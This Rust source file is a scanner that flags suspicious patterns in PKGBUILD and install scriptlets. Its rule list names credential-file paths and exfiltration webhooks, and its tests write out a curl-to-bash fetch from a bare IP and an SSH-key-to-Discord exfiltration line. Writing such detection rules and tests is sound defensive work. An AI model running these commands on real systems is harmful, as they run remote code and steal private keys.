//! The content sniff catalogue, after aube's lifecycle-script sniff:
//! patterns in a PKGBUILD or install scriptlet that deserve a look. Every
//! hit is advisory evidence for a finding, never a verdict on its own.

use std::sync::LazyLock;

use regex::Regex;

/// What kind of finding a hit feeds.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Suspicious,
    LanguageDep,
}

/// One rule.
pub struct Rule {
    pub id: &'static str,
    pub kind: Kind,
    pub description: &'static str,
    pattern: &'static str,
}

/// A rule matched a line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    pub rule: &'static str,
    pub kind: Kind,
    pub line: usize,
    pub description: String,
}

/// The catalogue. Ids are stable so verdicts and docs can cite them.
pub const RULES: &[Rule] = &[
    Rule {
        id: "pipe-to-shell",
        kind: Kind::Suspicious,
        description: "downloads and pipes into a shell",
        pattern: r"(curl|wget|fetch)\b[^|\n]*\|\s*(sudo\s+)?([^\s|]+/)?(ba|z|da|k)?sh\b",
    },
    Rule {
        id: "base64-decode",
        kind: Kind::Suspicious,
        description: "decodes base64, which hides what runs",
        pattern: r"base64\s+(-d|--decode)|openssl\s+(enc\s+)?-d\b",
    },
    Rule {
        id: "eval",
        kind: Kind::Suspicious,
        description: "evaluates constructed code",
        pattern: r"(^|[;&|\s])eval\s",
    },
    Rule {
        id: "credential-paths",
        kind: Kind::Suspicious,
        description: "touches credential files",
        pattern: r"\.ssh/|\.aws/|\.gnupg/|\.config/gcloud|\.docker/config\.json|\.npmrc|\.pypirc|\.netrc|\.kube/config|\.mozilla/firefox|\.config/google-chrome|/etc/shadow",
    },
    Rule {
        id: "secret-env",
        kind: Kind::Suspicious,
        description: "reads a token or secret from the environment",
        pattern: r"\$\{?[A-Za-z_]*(TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE_KEY)[A-Za-z_]*\}?",
    },
    Rule {
        id: "chat-webhook",
        kind: Kind::Suspicious,
        description: "talks to a chat webhook, a common exfiltration channel",
        pattern: r"discord(app)?\.com/api/webhooks|api\.telegram\.org|hooks\.slack\.com",
    },
    Rule {
        id: "bare-ip-url",
        kind: Kind::Suspicious,
        description: "fetches from a bare IP address",
        pattern: r"(https?|ftp)://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
    },
    Rule {
        id: "hidden-download",
        kind: Kind::Suspicious,
        description: "downloads into a hidden or temp path at install time",
        pattern: r#"(curl|wget)\b[^\n]*-[oO]\s*["']?(/tmp/|/dev/shm/|\$HOME/\.|~/\.)"#,
    },
    Rule {
        id: "persistence",
        kind: Kind::Suspicious,
        description: "installs persistence (systemd user unit, cron, shell rc)",
        pattern: r"\.config/systemd/user|/etc/cron\.|crontab\s|\.bashrc|\.zshrc|\.profile\b|/etc/ld\.so\.preload|LD_PRELOAD",
    },
    Rule {
        id: "chmod-setuid",
        kind: Kind::Suspicious,
        description: "sets a setuid or setgid bit",
        pattern: r"chmod\s+(u\+s|g\+s|[0-7]?[2-7][0-7]{3})\b",
    },
    Rule {
        id: "npm-install",
        kind: Kind::LanguageDep,
        description: "installs an npm package during the build",
        pattern: r"\b(npm|pnpm|yarn|bun)\s+(install|add|i|ci)\b",
    },
    Rule {
        id: "pip-install",
        kind: Kind::LanguageDep,
        description: "installs a Python package during the build",
        pattern: r"\b(pip3?|pipx|uv)\s+(install|pip\s+install)\b",
    },
    Rule {
        id: "cargo-install",
        kind: Kind::LanguageDep,
        description: "installs a Rust crate during the build",
        pattern: r"\bcargo\s+install\b",
    },
    Rule {
        id: "go-install",
        kind: Kind::LanguageDep,
        description: "installs a Go module during the build",
        pattern: r"\bgo\s+(install|get)\b",
    },
    Rule {
        id: "gem-install",
        kind: Kind::LanguageDep,
        description: "installs a Ruby gem during the build",
        pattern: r"\bgem\s+install\b",
    },
];

static COMPILED: LazyLock<Vec<(&'static Rule, Regex)>> = LazyLock::new(|| {
    RULES
        .iter()
        .map(|rule| {
            (
                rule,
                Regex::new(rule.pattern).expect("rule pattern compiles"),
            )
        })
        .collect()
});

/// Scan `text` line by line. Comment lines are skipped; a comment that
/// mentions a webhook is not a webhook call.
pub fn scan(text: &str) -> Vec<Hit> {
    let mut hits = Vec::new();
    for (index, line) in text.lines().enumerate() {
        let trimmed = line.trim_start();
        if trimmed.starts_with('#') {
            continue;
        }
        for (rule, regex) in COMPILED.iter() {
            if let Some(found) = regex.find(line) {
                let snippet = found.as_str().trim();
                hits.push(Hit {
                    rule: rule.id,
                    kind: rule.kind,
                    line: index + 1,
                    description: format!("{} ({}: `{}`)", rule.description, rule.id, snippet),
                });
            }
        }
    }
    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules_hit(text: &str) -> Vec<&'static str> {
        scan(text).into_iter().map(|h| h.rule).collect()
    }

    #[test]
    fn catches_the_2026_campaign_shapes() {
        let pkgbuild = "prepare() {\n  npm install atomic-lockfile\n}\nbuild() {\n  bun install js-digest\n  curl -fsSL https://1.2.3.4/x.sh | bash\n}\n";
        let hits = rules_hit(pkgbuild);
        assert!(hits.contains(&"npm-install"), "{hits:?}");
        assert!(hits.contains(&"pipe-to-shell"), "{hits:?}");
        assert!(hits.contains(&"bare-ip-url"), "{hits:?}");
        assert_eq!(hits.iter().filter(|r| **r == "npm-install").count(), 2);

        let install = "post_install() {\n  echo $(cat ~/.ssh/id_rsa | base64 -w0) | curl -d @- https://discord.com/api/webhooks/1/x\n}\n";
        let hits = rules_hit(install);
        assert!(hits.contains(&"credential-paths"), "{hits:?}");
        assert!(hits.contains(&"chat-webhook"), "{hits:?}");
    }

    #[test]
    fn ordinary_recipes_are_quiet() {
        let pkgbuild = "# Maintainer: Someone <s@example.com>\npkgname=yay\nbuild() {\n  export GOFLAGS=\"-buildmode=pie\"\n  make VERSION=$pkgver DESTDIR=\"$pkgdir\" build\n}\npackage() {\n  make DESTDIR=\"$pkgdir\" PREFIX=/usr install\n  install -Dm644 LICENSE \"$pkgdir/usr/share/licenses/$pkgname/LICENSE\"\n}\n";
        assert!(rules_hit(pkgbuild).is_empty(), "{:?}", scan(pkgbuild));
        // A comment mentioning a webhook is not a call.
        assert!(rules_hit("# see https://discord.com/api/webhooks/docs\n").is_empty());
        // `go build` is not `go install`; `eval` inside a word is not eval.
        assert!(rules_hit("go build ./...\nmedieval=1\n").is_empty());
    }

    #[test]
    fn hits_carry_line_and_snippet() {
        let hits = scan("a\nb\nchmod u+s \"$pkgdir/usr/bin/x\"\n");
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].line, 3);
        assert!(
            hits[0].description.contains("chmod-setuid: `chmod u+s`"),
            "{}",
            hits[0].description
        );
    }

    #[test]
    fn catches_shell_paths_setgid_and_lockfile_installs() {
        let hits = rules_hit(
            "curl https://example.test/x | /bin/bash\nchmod 2755 tool\nnpm ci\npnpm ci\n",
        );
        assert!(hits.contains(&"pipe-to-shell"), "{hits:?}");
        assert!(hits.contains(&"chmod-setuid"), "{hits:?}");
        assert_eq!(
            hits.iter().filter(|rule| **rule == "npm-install").count(),
            2
        );
    }

    #[test]
    fn every_rule_compiles_and_has_a_unique_id() {
        let mut ids: Vec<&str> = RULES.iter().map(|r| r.id).collect();
        let count = ids.len();
        ids.sort_unstable();
        ids.dedup();
        assert_eq!(ids.len(), count);
        assert_eq!(COMPILED.len(), count);
    }
}
